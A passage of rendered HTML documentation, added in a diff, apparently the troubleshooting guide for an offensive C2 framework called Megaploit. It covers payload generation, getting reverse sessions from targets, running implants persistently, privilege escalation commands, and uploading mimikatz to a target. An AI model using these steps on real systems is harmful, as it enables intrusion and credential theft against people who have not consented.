+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>git<span class="w"> </span>clone<span class="w"> </span>git@github.com:Josefifir/Megaploit.git
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="c1"># Or download the ZIP directly from GitHub and extract</span>
+</span></code></pre></div>
+<hr />
+<h2 id="2-server-wont-start">2. Server Won't Start<a class="headerlink" href="#2-server-wont-start" title="Permanent link">&para;</a></h2>
+<h3 id="address-already-in-use-oserror-errno-98"><code>Address already in use</code> / <code>OSError: [Errno 98]</code><a class="headerlink" href="#address-already-in-use-oserror-errno-98" title="Permanent link">&para;</a></h3>
+<p><strong>Cause:</strong> Another process is already listening on that port.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Find what is using port 4444</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>sudo<span class="w"> </span>lsof<span class="w"> </span>-i<span class="w"> </span>:4444
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="c1"># or</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>sudo<span class="w"> </span>ss<span class="w"> </span>-tlnp<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="m">4444</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="c1"># Kill the process (replace PID with the actual number)</span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>sudo<span class="w"> </span><span class="nb">kill</span><span class="w"> </span>-9<span class="w"> </span>&lt;PID&gt;
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="c1"># Or just use a different port</span>
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>python3<span class="w"> </span>-m<span class="w"> </span>megaploit<span class="w"> </span>--port<span class="w"> </span><span class="m">5555</span>
+</span></code></pre></div>
+<hr />
+<h3 id="permission-denied-on-port-443-or-80"><code>Permission denied</code> on port 443 or 80<a class="headerlink" href="#permission-denied-on-port-443-or-80" title="Permanent link">&para;</a></h3>
+<p>Ports below 1024 require root on Linux:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># Run as root</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>sudo<span class="w"> </span>python3<span class="w"> </span>-m<span class="w"> </span>megaploit<span class="w"> </span>--port<span class="w"> </span><span class="m">443</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="c1"># OR use a high port and redirect with iptables (no root in runtime)</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>sudo<span class="w"> </span>iptables<span class="w"> </span>-t<span class="w"> </span>nat<span class="w"> </span>-A<span class="w"> </span>PREROUTING<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--dport<span class="w"> </span><span class="m">443</span><span class="w"> </span>-j<span class="w"> </span>REDIRECT<span class="w"> </span>--to-port<span class="w"> </span><span class="m">4444</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>python3<span class="w"> </span>-m<span class="w"> </span>megaploit<span class="w"> </span>--port<span class="w"> </span><span class="m">4444</span>
+</span></code></pre></div>
+<hr />
+<h3 id="server-starts-but-shows-warning-running-as-root">Server starts but shows <code>[!] Warning: running as root</code><a class="headerlink" href="#server-starts-but-shows-warning-running-as-root" title="Permanent link">&para;</a></h3>
+<p>This is a warning, not an error. It is safe to ignore in a controlled lab. For production engagements, run as a non-root user where possible.</p>
+<hr />
+<h3 id="importerror-or-syntaxerror-at-startup"><code>ImportError</code> or <code>SyntaxError</code> at startup<a class="headerlink" href="#importerror-or-syntaxerror-at-startup" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># Check that all dependencies are installed</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>pip<span class="w"> </span>install<span class="w"> </span>-r<span class="w"> </span>requirements.txt
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="c1"># Check for a corrupted install</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>pip<span class="w"> </span>install<span class="w"> </span>--force-reinstall<span class="w"> </span>-r<span class="w"> </span>requirements.txt
+</span></code></pre></div>
+<hr />
+<h2 id="3-payload-generation-errors">3. Payload Generation Errors<a class="headerlink" href="#3-payload-generation-errors" title="Permanent link">&para;</a></h2>
+<h3 id="error-lhost-is-not-reachable-from-target"><code>Error: LHOST is not reachable from target</code><a class="headerlink" href="#error-lhost-is-not-reachable-from-target" title="Permanent link">&para;</a></h3>
+<p>This is only a warning — Megaploit cannot verify connectivity at generation time. The payload was still created. Make sure:</p>
+<ol>
+<li>Your LHOST IP is the IP the <strong>target</strong> can reach (not 127.0.0.1).</li>
+<li>The port is open and Megaploit is listening.</li>
+</ol>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># Check your IP addresses</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>ip<span class="w"> </span>addr<span class="w"> </span>show
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="c1"># or</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>ifconfig
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="c1"># Common mistake: using the loopback address</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="c1"># WRONG:  LHOST = 127.0.0.1</span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="c1"># RIGHT:  LHOST = 192.168.1.50  (your actual LAN IP)</span>
+</span></code></pre></div>
+<hr />
+<h3 id="error-generating-exe-wine-not-found"><code>Error generating EXE: wine not found</code><a class="headerlink" href="#error-generating-exe-wine-not-found" title="Permanent link">&para;</a></h3>
+<p>EXE payloads on Linux require Wine:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># Install Wine on Kali / Ubuntu</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>sudo<span class="w"> </span>dpkg<span class="w"> </span>--add-architecture<span class="w"> </span>i386
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>sudo<span class="w"> </span>apt-get<span class="w"> </span>update
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>sudo<span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>wine<span class="w"> </span>wine32
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="c1"># Verify</span>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>wine<span class="w"> </span>--version
+</span></code></pre></div>
+<hr />
+<h3 id="error-mingw-w64-not-found-cross-compilation"><code>Error: mingw-w64 not found</code> (cross-compilation)<a class="headerlink" href="#error-mingw-w64-not-found-cross-compilation" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>sudo<span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>mingw-w64
+</span></code></pre></div>
+<hr />
+<h3 id="generated-payload-is-0-bytes">Generated payload is 0 bytes<a class="headerlink" href="#generated-payload-is-0-bytes" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># Check for errors in the output — there was likely a silent failure</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>python3<span class="w"> </span>-m<span class="w"> </span>megaploit<span class="w"> </span>--debug
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="c1"># Then regenerate the payload</span>
+</span></code></pre></div>
+<hr />
+<h3 id="payload-generation-hangs">Payload generation hangs<a class="headerlink" href="#payload-generation-hangs" title="Permanent link">&para;</a></h3>
+<p>Press <code>Ctrl+C</code> to cancel. Then:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1"># Run with --debug to see where it stalls</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>python3<span class="w"> </span>-m<span class="w"> </span>megaploit<span class="w"> </span>--debug
+</span></code></pre></div>
+<hr />
+<h2 id="4-no-session-after-running-payload">4. No Session After Running Payload<a class="headerlink" href="#4-no-session-after-running-payload" title="Permanent link">&para;</a></h2>
+<p>This is the most common issue. Work through these checks in order:</p>
+<h3 id="step-1-confirm-megaploit-is-actually-listening">Step 1 — Confirm Megaploit is actually listening<a class="headerlink" href="#step-1-confirm-megaploit-is-actually-listening" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># In another terminal</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>sudo<span class="w"> </span>ss<span class="w"> </span>-tlnp<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="m">4444</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="c1"># Should show:  LISTEN  0  128  0.0.0.0:4444</span>
+</span></code></pre></div>
+<p>If nothing shows, Megaploit is not running or crashed. Restart it.</p>
+<hr />
+<h3 id="step-2-confirm-the-target-can-reach-your-machine">Step 2 — Confirm the target can reach your machine<a class="headerlink" href="#step-2-confirm-the-target-can-reach-your-machine" title="Permanent link">&para;</a></h3>
+<p>From the <strong>target</strong>, try to ping or connect to your attacker IP:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1"># From Linux target</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>ping<span class="w"> </span><span class="m">192</span>.168.1.50
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>nc<span class="w"> </span>-zv<span class="w"> </span><span class="m">192</span>.168.1.50<span class="w"> </span><span class="m">4444</span><span class="w">   </span><span class="c1"># should say &quot;succeeded&quot;</span>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="c1"># From Windows target (PowerShell)</span>
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>Test-NetConnection<span class="w"> </span>-ComputerName<span class="w"> </span><span class="m">192</span>.168.1.50<span class="w"> </span>-Port<span class="w"> </span><span class="m">4444</span>
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="c1"># TcpTestSucceeded: True  ← good</span>
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="c1"># TcpTestSucceeded: False ← firewall blocking</span>
+</span></code></pre></div>
+<hr />
+<h3 id="step-3-check-your-firewall">Step 3 — Check your firewall<a class="headerlink" href="#step-3-check-your-firewall" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1"># Kali / Ubuntu — allow incoming on the listener port</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>sudo<span class="w"> </span>ufw<span class="w"> </span>allow<span class="w"> </span><span class="m">4444</span>/tcp
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>sudo<span class="w"> </span>ufw<span class="w"> </span>status
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="c1"># If using iptables directly</span>
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>sudo<span class="w"> </span>iptables<span class="w"> </span>-I<span class="w"> </span>INPUT<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--dport<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-j<span class="w"> </span>ACCEPT
+</span></code></pre></div>
+<hr />
+<h3 id="step-4-confirm-lhost-and-lport-in-the-payload-match-your-server">Step 4 — Confirm LHOST and LPORT in the payload match your server<a class="headerlink" href="#step-4-confirm-lhost-and-lport-in-the-payload-match-your-server" title="Permanent link">&para;</a></h3>
+<p>If you generated the payload with <code>LHOST=192.168.1.50</code> but later changed your IP or moved to a different network, the payload still tries to reach the old address. <strong>Regenerate the payload</strong> with the correct LHOST.</p>
+<hr />
+<h3 id="step-5-check-if-youre-behind-nat-home-router-cloud-vm">Step 5 — Check if you're behind NAT (home router / cloud VM)<a class="headerlink" href="#step-5-check-if-youre-behind-nat-home-router-cloud-vm" title="Permanent link">&para;</a></h3>
+<p>If you are behind a NAT router:</p>
+<ul>
+<li>Your LAN IP (e.g., <code>192.168.1.50</code>) is <strong>only</strong> reachable from the same LAN.</li>
+<li>For internet-facing payloads, use your <strong>public IP</strong> and set up <strong>port forwarding</strong> on your router.</li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c1"># Find your public IP</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>curl<span class="w"> </span>ifconfig.me
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="c1"># On your router: forward TCP 4444 → 192.168.1.50:4444</span>
+</span></code></pre></div>
+<p>Or use a <strong>VPS</strong> as the listener (no NAT issues):</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c1"># On VPS with public IP 203.0.113.10</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>python3<span class="w"> </span>-m<span class="w"> </span>megaploit<span class="w"> </span>--host<span class="w"> </span><span class="m">0</span>.0.0.0<span class="w"> </span>--port<span class="w"> </span><span class="m">4444</span>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="c1"># Generate payload with LHOST=203.0.113.10</span>
+</span></code></pre></div>
+<hr />
+<h3 id="step-6-check-the-payload-actually-ran">Step 6 — Check the payload actually ran<a class="headerlink" href="#step-6-check-the-payload-actually-ran" title="Permanent link">&para;</a></h3>
+<p>On the target, check for errors:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1"># Windows — check the application event log</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="c1"># (Win+R → eventvwr.msc → Windows Logs → Application)</span>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="c1"># Linux</span>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>dmesg<span class="w"> </span><span class="p">|</span><span class="w"> </span>tail<span class="w"> </span>-20
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>journalctl<span class="w"> </span>-xe<span class="w"> </span><span class="p">|</span><span class="w"> </span>tail<span class="w"> </span>-40
+</span></code></pre></div>
+<hr />
+<h2 id="5-session-opens-then-immediately-dies">5. Session Opens Then Immediately Dies<a class="headerlink" href="#5-session-opens-then-immediately-dies" title="Permanent link">&para;</a></h2>
+<h3 id="antivirus-killed-it">Antivirus killed it<a class="headerlink" href="#antivirus-killed-it" title="Permanent link">&para;</a></h3>
+<p>The most common cause. See <a href="#8-antivirus-killing-the-payload">Section 8</a>.</p>
+<hr />
+<h3 id="network-timeout-connection-is-too-slow">Network timeout — connection is too slow<a class="headerlink" href="#network-timeout-connection-is-too-slow" title="Permanent link">&para;</a></h3>
+<p>For targets over high-latency links, increase the keep-alive timeout:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>megaploit &gt; set SessionKeepAlive 60
+</span></code></pre></div>
+<hr />
+<h3 id="payload-ran-as-a-user-without-execute-permission">Payload ran as a user without execute permission<a class="headerlink" href="#payload-ran-as-a-user-without-execute-permission" title="Permanent link">&para;</a></h3>
+<p>Ensure the payload has execute permission on Linux:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>chmod<span class="w"> </span>+x<span class="w"> </span>./agent
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>./agent
+</span></code></pre></div>
+<hr />
+<h3 id="the-payload-process-exited">The payload process exited<a class="headerlink" href="#the-payload-process-exited" title="Permanent link">&para;</a></h3>
+<p>Try running the payload in a persistent way:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c1"># Linux — keep running in background after terminal closes</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>nohup<span class="w"> </span>./agent<span class="w"> </span><span class="p">&amp;</span>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="c1"># Windows — run minimised</span>
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>start<span class="w"> </span>/min<span class="w"> </span>payload.exe
+</span></code></pre></div>
+<hr />
+<h2 id="6-commands-not-working-in-session">6. Commands Not Working in Session<a class="headerlink" href="#6-commands-not-working-in-session" title="Permanent link">&para;</a></h2>
+<h3 id="error-session-is-not-responding"><code>Error: session is not responding</code><a class="headerlink" href="#error-session-is-not-responding" title="Permanent link">&para;</a></h3>
+<p>The target may have lost connectivity. Check:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>[session-1] &gt; ping
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a># If no response: session is dead
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>megaploit &gt; sessions    # session-1 may show as [dead]
+</span></code></pre></div>
+<p>Deliver a new payload and create a fresh session.</p>
+<hr />
+<h3 id="permission-denied-when-running-commands"><code>Permission denied</code> when running commands<a class="headerlink" href="#permission-denied-when-running-commands" title="Permanent link">&para;</a></h3>
+<p>You do not have enough privileges. Try:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>getprivs<span class="w">       </span><span class="c1"># see your current privileges</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>getsystem<span class="w">      </span><span class="c1"># attempt auto privilege escalation</span>
+</span></code></pre></div>
+<p>Or run the module:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>megaploit &gt; use post/suggest_exploit
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>megaploit &gt; set SESSION session-1
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>megaploit &gt; run
+</span></code></pre></div>
+<hr />
+<h3 id="shell-command-output-is-garbled-encoding-issues"><code>shell</code> command output is garbled / encoding issues<a class="headerlink" href="#shell-command-output-is-garbled-encoding-issues" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="c1"># Force UTF-8 on Windows</span>
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>shell<span class="w"> </span>chcp<span class="w"> </span><span class="m">65001</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>&lt;your<span class="w"> </span>command&gt;
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="c1"># Or use the powershell command instead of shell</span>
+</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>powershell<span class="w"> </span><span class="o">[</span>Console<span class="o">]</span>::OutputEncoding<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>System.Text.Encoding<span class="o">]</span>::UTF8<span class="p">;</span><span class="w"> </span>&lt;your<span class="w"> </span>command&gt;
+</span></code></pre></div>
+<hr />
+<h3 id="commands-run-but-produce-no-output">Commands run but produce no output<a class="headerlink" href="#commands-run-but-produce-no-output" title="Permanent link">&para;</a></h3>
+<p>Some commands are fire-and-forget (no output by design). For shell commands, always prefix with <code>shell</code>:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="c1"># Wrong — this runs as a Megaploit command (unknown)</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>ipconfig
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="c1"># Right — this runs as a system command</span>
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>shell<span class="w"> </span>ipconfig
+</span></code></pre></div>
+<hr />
+<h2 id="7-file-upload-download-failures">7. File Upload / Download Failures<a class="headerlink" href="#7-file-upload-download-failures" title="Permanent link">&para;</a></h2>
+<h3 id="error-file-not-found-during-upload"><code>Error: file not found</code> during upload<a class="headerlink" href="#error-file-not-found-during-upload" title="Permanent link">&para;</a></h3>
+<p>The path must be relative to where you launched Megaploit, or use an absolute path:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="c1"># Absolute path — always works</span>
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>upload<span class="w"> </span>/root/tools/mimikatz.exe<span class="w"> </span>C:<span class="se">\T</span>emp<span class="se">\m</span>.exe
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>
+</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="c1"># Relative path — relative to your CWD when you started Megaploit</span>
+</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>upload<span class="w"> </span>tools/mimikatz.exe<span class="w"> </span>C:<span class="se">\T</span>emp<span class="se">\m</span>.exe
+</span></code></pre></div>
+<hr />
+<h3 id="uploaddownload-stalls-at-0">Upload/download stalls at 0%<a class="headerlink" href="#uploaddownload-stalls-at-0" title="Permanent link">&para;</a></h3>
+<p>Check available disk space on the target:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>shell<span class="w"> </span>dir<span class="w"> </span>C:<span class="se">\ </span><span class="w">    </span><span class="c1"># Windows</span>
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>shell<span class="w"> </span>df<span class="w"> </span>-h<span class="w"> </span>/<span class="w">     </span><span class="c1"># Linux</span>
+</span></code></pre></div>
+<p>Also check your network connection — large file transfers over slow links can appear to stall.</p>
+<hr />
+<h3 id="access-denied-when-writing-to-target-path"><code>Access denied</code> when writing to target path<a class="headerlink" href="#access-denied-when-writing-to-target-path" title="Permanent link">&para;</a></h3>
+<p>Try a path the current user has write access to:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="c1"># Windows — usually writable locations</span>
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>C:<span class="se">\T</span>emp<span class="se">\</span>
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>C:<span class="se">\U</span>sers<span class="se">\&lt;</span>username&gt;<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\</span>
